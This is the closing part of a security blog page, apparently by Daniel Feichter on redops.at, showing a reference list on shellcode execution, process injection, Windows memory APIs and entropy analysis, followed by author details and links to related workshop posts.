+<ul><li><a href="https://csandker.io/2019/07/24/ABeginnersGuideToWindowsShellcodeExecutionTechniques.html">https://csandker.io/2019/07/24...</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection">https://www.ired.team/offensiv...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/en...</a></li><li><a href="https://en.wikipedia.org/wiki/XOR_cipher">https://en.wikipedia.org/wiki/...</a></li><li><a href="https://practicalsecurityanalytics.com/file-entropy/">https://practicalsecurityanaly...</a></li><li><a href="https://github.com/rapid7/metasploit-framework/blob/0cbfd483ae9291583f8f3bdabe3cf168c5b78991/lib/msf/core/payload/windows/reverse_tcp.rb">https://github.com/rapid7/meta...</a></li><li><a href="https://www.elastic.co/security-labs/hunting-memory">https://www.elastic.co/securit...</a></li><li><a href="https://en.wikipedia.org/wiki/Entropy_">https://en.wikipedia.org/wiki/...</a>(information_theory)</li><li><a href="https://www.socinvestigation.com/densityscout-entropy-analyzer-for-threat-hunting-and-incident-response/">https://www.socinvestigation.c...</a></li></ul>
+        </div>
+    </div>
+</section>
+                    </div>
+        <div class="blog-info container">
+            <div class="updated">
+                Last updated
+                <span class="desktop">
+                    17.03.24 19:53:36
+                </span>
+                <span class="mobile">
+                    17.03.24
+                </span>
+            </div>
+            <div class="author">
+                Daniel Feichter
+            </div>
+        </div>
+        <div class="further-reading container">
+                                        <div class="heading">
+                    Posts about related Topics
+                </div>
+                        <ul class="blog-list">
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/demo-material-endpoint-security-insights-workshop" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2026-01-23
+    </div>
+    <div class="blog-title">
+        Demo Material – Endpoint Security Insights Workshop
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/training-endpoint-security-insights-shellcode-loaders-and-evasion-fundamentals" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2026-01-02
+    </div>
+    <div class="blog-title">
+        Training/Workshop - Endpoint Security Insights: Shellcode Loaders &amp; Evasion Fundamentals
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/the-emulators-gambit-executing-code-from-non-executable-memory" class="blog-link">
+    <div class="tag">
+        Windows Internals
+    </div>
+    <div class="post-date">
+        2025-10-15
+    </div>
+    <div class="blog-title">
+        The Emulator's Gambit: Executing Code from Non-Executable Memory
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/endpoint-security-insights-workshop-option-b-self-paced" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2025-09-10
+    </div>
+    <div class="blog-title">
+        Endpoint Security Insights Workshop: Option B - Self-Paced
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                            </ul>
+        </div>
+    </div>
+        </main>
+        <button type="button" id="BackToTop">Back to top</button>
+        
+
+        
+
+<link href="https://redops.at/dist/assets/main-ioE-islD.css" rel="stylesheet" media="all">
+            
+    
+    <div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
+
+</body></html>
